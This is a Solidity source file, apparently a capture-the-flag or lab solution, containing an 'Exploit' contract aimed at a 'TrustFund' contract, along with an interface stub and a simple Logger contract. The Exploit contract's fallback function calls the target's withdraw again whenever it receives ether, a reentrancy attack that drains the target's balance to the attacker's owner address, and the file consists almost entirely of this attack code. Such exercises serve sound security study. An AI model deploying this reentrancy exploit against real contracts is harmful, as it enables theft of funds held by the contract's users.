// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.20 <0.5;
import "hardhat/console.sol";
//import "./TrustFund.sol";

contract Exploit{
    TrustFund target;
    address owner;
    address tar;

    constructor (address _tar) public payable{
        target = TrustFund(_tar);
        //tar = _tar;
        //target.deposit.value(msg.value)();
        owner = msg.sender;
        //target.deposit.value(1e17);
    } 

    function deposit() public payable{
        require(msg.sender == owner);
        //tar.call.value(msg.value)(bytes4(keccak256("deposit()")));
        //console.log("msg value:", msg.value);
        target.deposit.value(msg.value)();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function tyrIt() public payable{
        require(msg.sender == owner);
        //0.05 eth
        target.withdraw(5e16);
    }

    function () public payable{
        target.withdraw(5e16);
    }


}

contract TrustFund {
  function deposit() public payable returns (bool) {
    return true;
  }

  function withdraw(uint256 _amount) public {
    
  }
}

contract Logger {
  struct Message {
    address sender;
    uint256 amount;
    string note;
  }

  Message[] History;
  Message public LastLine;

  function LogTransfer(address _sender, uint256 _amount, string memory _note) public {
    LastLine.sender = _sender;
    LastLine.amount = _amount;
    LastLine.note = _note;
    History.push(LastLine);
  }
}